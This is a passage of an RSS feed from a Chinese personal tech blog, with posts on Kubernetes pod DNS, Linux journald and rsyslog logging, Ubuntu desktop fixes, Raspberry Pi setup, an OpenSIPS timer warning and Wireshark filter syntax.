      <description>&lt;p&gt;原文：&lt;a href=&#34;https://cloud.google.com/blog/products/gcp/kubernetes-best-practices-terminating-with-grace&#34;&gt;https://cloud.google.com/blog/products/gcp/kubernetes-best-practices-terminating-with-grace&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Editor’s note: Today is the fifth installment in a seven-part video and blog series from Google Developer Advocate Sandeep Dinesh on how to get the most out of your Kubernetes environment.&lt;/p&gt;
&lt;p&gt;When it comes to distributed systems, handling failure is key. Kubernetes helps with this by utilizing controllers that can watch the state of your system and restart services that have stopped performing. On the other hand, Kubernetes can often forcibly terminate your application as part of the normal operation of the system.&lt;/p&gt;</description>
    </item>
    <item>
      <title>K8s pod node网络</title>
      <link>https://wdd.js.org/container/k8s-network/</link>
      <pubDate>Wed, 26 Oct 2022 08:57:54 +0800</pubDate>
      <guid>https://wdd.js.org/container/k8s-network/</guid>
      <description>&lt;h1 id=&#34;1-同一个node上的pod网段相同&#34;&gt;1. 同一个Node上的pod网段相同&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;kube-node1
&lt;ul&gt;
&lt;li&gt;pod1: 172.16.30.8&lt;/li&gt;
&lt;li&gt;pod2: 172.16.30.9&lt;/li&gt;
&lt;li&gt;pod3: 172.16.30.23&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;kube-node2
&lt;ul&gt;
&lt;li&gt;pod4: 172.18.0.5&lt;/li&gt;
&lt;li&gt;pod5: 172.18.0.6&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2-pod中service-name-dns解析&#34;&gt;2. pod中service name dns解析&lt;/h1&gt;
&lt;p&gt;使用nslookup命令去查询service name&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第2行 DNS服务器名&lt;/li&gt;
&lt;li&gt;第3行 DNS服务器地址&lt;/li&gt;
&lt;li&gt;第5行 目标主机的名称&lt;/li&gt;
&lt;li&gt;第6行 目标主机的IP地址&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bash-5.0# nslookup security
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Server:		10.254.10.20
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Address:	10.254.10.20#53
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Name:	security.test.svc.cluster.local
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Address: 10.254.63.136
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;21-问题1&#34;&gt;2.1. 问题1：&lt;/h2&gt;
&lt;p&gt;那么问题来了，为什么我要解析的域名是security, 但是返回的主机名是security.test.svc.cluster.local呢？&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bash-5.0# cat /etc/resolv.conf
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nameserver 10.254.10.20
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;search test.svc.cluster.local svc.cluster.local cluster.local
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;options ndots:5
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在/etc/resolve.conf中，search选项后有几个值，它的作用是，如果你搜索的主机名中没有点, 那么你输入的名字就会和search选中的名字组合，也就是说。&lt;/p&gt;
&lt;p&gt;你输入的是abc, 那么就会按照如何下的顺序去解析域名&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;abc.test.svc.cluster.local&lt;/li&gt;
&lt;li&gt;abc.svc.cluster.local&lt;/li&gt;
&lt;li&gt;cluster.local&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以我们看到的dns解析的名字就是abc.test.svc.cluster.local。&lt;/p&gt;
&lt;h2 id=&#34;22-问题2&#34;&gt;2.2. 问题2：&lt;/h2&gt;
&lt;p&gt;在resolve.conf中，dns服务器的地址是10.254.10.20，那么这个地址运行的是什么呢？&lt;/p&gt;
&lt;p&gt;我们用dns反向解析，将IP解析为域名，可以看到主机的名称为kube-dns.kube-system.svc.cluster.local.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bash-5.0# nslookup 10.254.10.20
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;20.10.254.10.in-addr.arpa	name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; kube-dns.kube-system.svc.cluster.local.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;而实际上，这个IP地址就是kube-dns的地址。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linux 日志系统简述</title>
      <link>https://wdd.js.org/posts/2022/10/linux-journal/</link>
      <pubDate>Wed, 26 Oct 2022 08:44:12 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/10/linux-journal/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/10/linux-journal/2022-10-26-08-45-41.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-序言&#34;&gt;1. 序言&lt;/h1&gt;
&lt;p&gt;日志文件包含系统的运行信息，包括内核、服务、应用程序等的日志。日志在分析系统故障、排查应用问题等方面，有着至关重要的作用。&lt;/p&gt;
&lt;h1 id=&#34;2-哪些进程负责管理日志&#34;&gt;2. 哪些进程负责管理日志？&lt;/h1&gt;
&lt;p&gt;默认情况下，系统上有两个守护进程服务管理日志。journald和rsyslogd。&lt;/p&gt;
&lt;p&gt;journald是systemd的一个组件，journald的负责收集日志，日志可以来自&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Syslog日志&lt;/li&gt;
&lt;li&gt;内核日志&lt;/li&gt;
&lt;li&gt;初始化内存日志&lt;/li&gt;
&lt;li&gt;启动日志&lt;/li&gt;
&lt;li&gt;所有服务写到标准输出和标准错误的日志&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;journal收集并整理收到的日志，使其易于被使用。&lt;/p&gt;
&lt;p&gt;有以下几点需要注意&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;默认情况下，journal的日志是不会持久化的。&lt;/li&gt;
&lt;li&gt;journal的日志是二进制的格式，并不能使用文本查看工具，例如cat, 或者vim去分析。journal的日志需要用journalctl命令去读取。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;journald会把日志写到一个socket中，rsyslog可以通过这个socket来获取日志，然后去写文件。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/10/linux-journal/2022-10-26-08-47-16.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;3-日志文件文件位置&#34;&gt;3. 日志文件文件位置&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;日志文件位置 /var/log/ 目录&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;4-日志配置文件位置&#34;&gt;4. 日志配置文件位置&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;/etc/rsyslog.conf  rsyslogd配置文件&lt;/li&gt;
&lt;li&gt;/etc/logrotate.conf  日志回滚的相关配置&lt;/li&gt;
&lt;li&gt;/etc/systemd/journald.conf  journald的配置文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;5-rsyslogconf&#34;&gt;5. rsyslog.conf&lt;/h1&gt;
&lt;h2 id=&#34;51-模块加载&#34;&gt;5.1. 模块加载&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;注意 imjournal就是用来负责访问journal中的日志&lt;/li&gt;
&lt;li&gt;imuxsock 提供本地日志输入支持，例如使用logger命令输入日志&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ModLoad imuxsock &lt;span style=&#34;color:#75715e&#34;&gt;# provides support for local system logging (e.g. via logger command)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ModLoad imjournal &lt;span style=&#34;color:#75715e&#34;&gt;# provides access to the systemd journal&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;52-过滤&#34;&gt;5.2. 过滤&lt;/h2&gt;
&lt;h3 id=&#34;521-优先级过滤&#34;&gt;5.2.1. 优先级过滤&lt;/h3&gt;
&lt;p&gt;**模式：FACILITY.**&lt;strong&gt;PRIORITY&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设备(FACILITY): kern (0), user (1), mail (2), daemon (3), auth (4), syslog (5), lpr (6), news (7), cron (8), authpriv (9), ftp (10), and local0 through local7 (16 - 23).&lt;/li&gt;
&lt;li&gt;日志等级：debug (7), info (6), notice (5), warning (4), err (3), crit (2), alert (1), and emerg (0).&lt;/li&gt;
&lt;li&gt;正则
&lt;ul&gt;
&lt;li&gt;= 指定某个级别&lt;/li&gt;
&lt;li&gt;! 排除某个级别&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;匹配所有级别&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Example: &lt;/p&gt;</description>
    </item>
    <item>
      <title>Ubuntu 使用过程中遇到的问题以及解决方案</title>
      <link>https://wdd.js.org/posts/2022/10/ubuntu-tips/</link>
      <pubDate>Tue, 25 Oct 2022 12:56:41 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/10/ubuntu-tips/</guid>
      <description>&lt;h1 id=&#34;1-ubuntu-wine-微信中文乱码&#34;&gt;1. ubuntu wine 微信中文乱码&lt;/h1&gt;
&lt;p&gt;修改文件
/opt/deepinwine/tools/run.sh
/opt/deepinwine/tools/run_v2.sh
将WINE_CMD那行中加入LC_ALL=zh_CN.UTF-8&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;WINE_CMD&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LC_ALL=zh_CN.UTF-8 deepin-wine&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;参考
&lt;a href=&#34;https://gitee.com/wszqkzqk/deepin-wine-for-ubuntu&#34;&gt;https://gitee.com/wszqkzqk/deepin-wine-for-ubuntu&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-ubuntu-2004-wine-微信-qq-截图时黑屏&#34;&gt;2. ubuntu 20.04 wine 微信 qq 截图时黑屏&lt;/h1&gt;
&lt;p&gt;之前截图都是好的的，不知道为什么，今天截图时，点击了微信的截图按钮后，屏幕除了状态栏，都变成黑色的了。&lt;/p&gt;
&lt;p&gt;各种搜索引擎搜了一遍，没有发现解决方案。&lt;/p&gt;
&lt;p&gt;最后决定思考最近对系统做了什么变更，最近我好像给系统安装了新的主题，然后在登录时，选择了新的主题，而没有选择默认的ubuntu主题。&lt;/p&gt;
&lt;p&gt;在登录界面的右下角，有个按钮，点击之后，可以选择主题。&lt;/p&gt;
&lt;p&gt;最近我都是选择其他的主题，没有选择默认的ubuntu主题，然后我就注销之后，重新在登录时选择默认的ubuntu主题后，再次打开微信截图，功能恢复正常。&lt;/p&gt;
&lt;p&gt;所以说，既然选择ubuntu了，就没必要搞些花里胡哨的东西。ubuntu默认的主题挺好看的，而且支持自带主题的设置，就没必要再折腾了。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/10/ubuntu-tips/2022-10-25-12-59-20.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;3-open-ubuntu-2004-锁屏后-解锁屏幕非常慢&#34;&gt;3. [open] ubuntu 20.04 锁屏后 解锁屏幕非常慢&lt;/h1&gt;
&lt;p&gt;super + l可以用来锁屏，锁屏之后屏幕变成黑屏。&lt;/p&gt;
&lt;p&gt;黑屏之后，如果需要唤醒屏幕，可以随便在键盘上按键，去唤醒屏幕。但是这个唤醒的过程感觉很慢，基本上要随便按键接近十几秒，屏幕才能被点亮，网上搜了下，但是没有找到原因。&lt;/p&gt;
&lt;p&gt;但是有个解决办法，就是在黑屏状态下，不要随便输入，而要输入正确的密码，然后按回车键， 这样会快很多。&lt;/p&gt;
&lt;p&gt;也就是说，系统运行正常，可能是显示器的问题。&lt;/p&gt;
&lt;h1 id=&#34;4-ubuntu-2004-xorg-高cpu-桌面卡死&#34;&gt;4. ubuntu 20.04 xorg 高cpu 桌面卡死&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo systemctl restart gdm
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;5-ubuntu-状态栏显示网速&#34;&gt;5. ubuntu 状态栏显示网速&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo add-apt-repository ppa:fossfreedom/indicator-sysmonitor 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install indicator-sysmonitor
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在任务启动中选择System Monitor&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/10/ubuntu-tips/2022-10-25-13-01-01.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/10/ubuntu-tips/2022-10-25-13-01-06.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;在配置中可以选择开机启动&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/10/ubuntu-tips/2022-10-25-13-01-17.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;在高级中可以设置显示哪些列， 我只关系网速，所以只写了{net}&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/10/ubuntu-tips/2022-10-25-13-01-28.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;6-在命令行查看图片&#34;&gt;6. 在命令行查看图片&lt;/h1&gt;
&lt;p&gt;实际上终端并不能显示图片，而是调用了外部的程序取显示图片。&lt;/p&gt;</description>
    </item>
    <item>
      <title>树莓派初始化配置</title>
      <link>https://wdd.js.org/posts/2022/10/raspi-config/</link>
      <pubDate>Tue, 25 Oct 2022 12:12:05 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/10/raspi-config/</guid>
      <description>&lt;p&gt;我已经装过几次树莓派的系统了，记录一些使用心得。&lt;/p&gt;
&lt;h1 id=&#34;1-选择哪个版本&#34;&gt;1. 选择哪个版本&lt;/h1&gt;
&lt;p&gt;最好用无&lt;a href=&#34;https://downloads.raspberrypi.org/raspbian_lite_latest&#34;&gt;桌面版&lt;/a&gt;，无桌面版更加稳定。我之前用过几次桌面版，桌面版存在以下问题。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用偶尔感觉会卡&lt;/li&gt;
&lt;li&gt;经常使用一天之后，第二天要重启系统。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;2-关于初始设置&#34;&gt;2. 关于初始设置&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;默认的用户是 pi，默认的密码是raspberry&lt;/li&gt;
&lt;li&gt;登录成功之后，sudo passwd pi 来修改pi用户的密码&lt;/li&gt;
&lt;li&gt;登录之后，sudo passwd root 来设置root的用户密码&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;3-开启ssh-远程登录服务&#34;&gt;3. 开启ssh 远程登录服务&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;raspi-config
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/10/raspi-config/2022-10-25-12-12-50.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/10/raspi-config/2022-10-25-12-13-01.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;4-root用户ssh登录&#34;&gt;4. root用户ssh登录&lt;/h1&gt;
&lt;p&gt;默认树莓派是禁止使用root远程登录的，想要开启的话，需要编辑/etc/ssh/sshd_config文件，增加一行&lt;code&gt;PermitRootLogin yes&lt;/code&gt;, 然后重启ssh服务&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vi /etc/ssh/sshd_config
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PermitRootLogin yes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo systemctl restart ssh //  chong
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;5-关于联网&#34;&gt;5. 关于联网&lt;/h1&gt;
&lt;p&gt;联网有两个方案&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用网线连接，简单方便，但是有条线子，总会把桌面搞得很乱&lt;/li&gt;
&lt;li&gt;使用wifi连接，简单方便&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;使用wifi连接，一种方式是编辑配置文件，这个比较麻烦。我建议使用树莓派提供的raspi-config命令来设置wifi。&lt;/p&gt;
&lt;p&gt;在命令行中输入：raspi-config, 可以看到如下界面&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;按下箭头，选择NetWork Options，按回车确认&lt;/li&gt;
&lt;li&gt;进入网络设置后，按下箭头，选择N2 Wi-fi&lt;/li&gt;
&lt;li&gt;然后就很简单了，输入wifi名称和wifi密码，最好你的wifi名称是英文的，出现中文会很尴尬的。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/10/raspi-config/2022-10-25-12-13-27.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/10/raspi-config/2022-10-25-12-13-35.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;6-如何找到树莓派的ip地址&#34;&gt;6. 如何找到树莓派的IP地址&lt;/h1&gt;
&lt;p&gt;某些情况下，树莓派在断电重启之后会获得新的IP地址。在没有显示器的情况下，如果找到树莓派的IP呢？&lt;/p&gt;
&lt;p&gt;树莓派的MAC地址是：b8:27:eb:6c 开头&lt;/p&gt;
&lt;p&gt;所以你只需要输入: arp -a   就会打印网络中的主机以及MAC地址，找以b8:e7:eb:6c开头的，很可能就是树莓派。&lt;/p&gt;
&lt;h1 id=&#34;7-设置清华镜像源&#34;&gt;7. 设置清华镜像源&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://mirrors.tuna.tsinghua.edu.cn/help/raspbian/&#34;&gt;https://mirrors.tuna.tsinghua.edu.cn/help/raspbian/&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>utimer task &lt;tm-utimer&gt; already scheduled</title>
      <link>https://wdd.js.org/opensips/ch1/utime-task-scheduled/</link>
      <pubDate>Tue, 25 Oct 2022 12:06:54 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/utime-task-scheduled/</guid>
      <description>&lt;ul&gt;
&lt;li&gt;可能和avp_db_query有关
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://opensips.org/pipermail/users/2018-October/040157.html&#34;&gt;https://opensips.org/pipermail/users/2018-October/040157.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;What we found is that the warning go away if we comment out the single avp_db_query that is being used in our config.&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;_ The avp_db_query is not executed at the start, but only when specific header is present. Yet the fooding start immediately after opensips start. The mere presence of the avp_db_query function in config without execution is enough to have the issue._&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;可能和openssl库有关
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/OpenSIPS/opensips/issues/1771#issuecomment-517744489&#34;&gt;https://github.com/OpenSIPS/opensips/issues/1771#issuecomment-517744489&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;ere are your results. I&amp;rsquo;m attaching the full backtrace (looks about the same) and the logs containing the memory debug. Please let me know if you need additional info.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Wireshark抓包教程</title>
      <link>https://wdd.js.org/network/wireshark/</link>
      <pubDate>Tue, 25 Oct 2022 09:12:00 +0800</pubDate>
      <guid>https://wdd.js.org/network/wireshark/</guid>
      <description>&lt;h1 id=&#34;1-http抓包例子&#34;&gt;1. HTTP抓包例子&lt;/h1&gt;
&lt;p&gt;案例：本地向 http://192.168.40.134:31204/some-api，如何过滤？&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http and ip.addr &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 192.168.40.134 and tcp.port &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31204&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;语句分析：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;http 表示我只需要http的包&lt;/li&gt;
&lt;li&gt;ip.addr 表示只要源ip或者目标ip地址中包含192.168.40.134&lt;/li&gt;
&lt;li&gt;tcp.port 表示只要源端口或者目标端口中包含31204&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/wireshark/2022-10-25-09-14-12.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-为什么我写的表达式总是不对呢&#34;&gt;2. 为什么我写的表达式总是不对呢？😂&lt;/h1&gt;
&lt;p&gt;很多时候，你写的表达式背景色变成红色，说明表达式错误了，例如下图：&lt;code&gt;http and ip.port == 31204&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/wireshark/2022-10-25-09-14-37.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;写出&lt;strong&gt;ip.port这个语句，往往是对传输协议理解不清晰。😅&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ip是网络层的协议，port是传输层tcp或者udp中使用的。例如你写tcp.port == 80，udp.port ==3000这样是没问题的。但是port不能跟在ip的后面，如果你不清楚怎么写，你可以选择wireshark的智能提示。&lt;/p&gt;
&lt;p&gt;智能提示会提示所有可用的表达式。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/wireshark/2022-10-25-09-14-56.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;3-常用过滤表达式&#34;&gt;3. 常用过滤表达式&lt;/h1&gt;
&lt;p&gt;一般我们的过滤都是基于协议，ip地址或者端口号进行过滤的，&lt;/p&gt;
&lt;h2 id=&#34;31-基于协议的过滤&#34;&gt;3.1. 基于协议的过滤&lt;/h2&gt;
&lt;p&gt;直接输入协议名进行过滤&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/wireshark/2022-10-25-09-15-10.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;32-基于ip地址的过滤&#34;&gt;3.2. 基于IP地址的过滤&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/wireshark/2022-10-25-09-15-28.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;33-基于端口的过滤&#34;&gt;3.3. 基于端口的过滤&lt;/h2&gt;
&lt;p&gt;基于端口的过滤一般就两种&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;tcp.port == xxx&lt;/li&gt;
&lt;li&gt;udp.port == xxx&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/wireshark/2022-10-25-09-15-41.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;34-基于host的过滤&#34;&gt;3.4. 基于host的过滤&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/wireshark/2022-10-25-09-15-53.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;4-比较运算符支持&#34;&gt;4. 比较运算符支持&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;== 等于
!= 不等于
&amp;gt; 大于
&amp;lt; 小于
&amp;gt;= 大于等于
&amp;lt;= 小于等于
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip.addr &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 192.168.2.4
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;5-逻辑运算符&#34;&gt;5. 逻辑运算符&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;and 条件与&lt;/li&gt;
&lt;li&gt;or 条件或&lt;/li&gt;
&lt;li&gt;xor 仅能有一个条件为真&lt;/li&gt;
